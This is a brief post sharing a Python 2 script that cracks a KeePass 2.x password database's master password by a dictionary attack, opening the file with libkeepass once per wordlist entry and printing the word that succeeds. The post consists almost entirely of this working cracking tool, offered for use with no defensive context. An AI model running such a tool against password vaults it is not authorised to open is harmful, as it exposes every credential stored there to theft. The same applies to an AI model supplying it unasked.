### Crack a Keepass password database master password using python lib keypass

He is a script I made to crack keepass2.x.x password database. 

```python

#!/usr/bin/env python2
#
# Made By SakiiR - source : https://blog.joshdawes.com/keepass-dictionary-attack/

import sys
import libkeepass

if len(sys.argv) < 3:
    print '[+] Usage : ./keepasscrack.py <wordlist> <keepassfile>'
    sys.exit(0)

i = 0
words = open(sys.argv[1]).read().split('\n')
l = len(words)
for word in words:
    if i % 100 == 0:
        print '[^] Processing .. {}/{} - {}%'.format(i, l, i * 100 / l)
    try:
        with libkeepass.open(sys.argv[2], password=word) as kdb:
            print '[+] FOUND ! ' + word
            sys.exit(0)
    except IOError:
        pass
    i += 1
```
